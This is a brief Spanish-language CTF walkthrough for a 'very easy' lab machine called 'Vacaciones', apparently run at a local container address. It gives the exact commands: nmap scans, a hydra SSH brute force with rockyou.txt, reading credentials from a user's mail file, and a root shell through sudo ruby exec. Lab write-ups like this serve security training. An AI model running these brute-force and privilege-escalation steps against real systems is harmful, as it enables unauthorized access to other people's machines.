Maquina: Vacaciones
Autor: Romabri
Dificultad: Muy Facil

ping 172.17.0.2 -c 1

sudo nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
sudo nmap -sCV -p22,80 172.17.0.2 -oN targeted

miramos la web
https://172.17.0.2
obtenemos 2 usuarios que podemos explotar

sudo hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
obtenemos password de camilo

ssh camilo@172.17.0.2

sudo -l
vemos que camilo no tiene permisos

buscamos el correo que nos ponia en la web
/var/mail$ cd camilo
ls
cat correo.txt
y descubrimos las credenciales del otro usuario

accedemos a juan por ssh
ssh juan@172.17.0.2

sudo -l
descubrimos que podemos ejecutar ruby como usuario root
sudo /usr/bin/ruby -e 'exec "/bin/bash"'
whoami
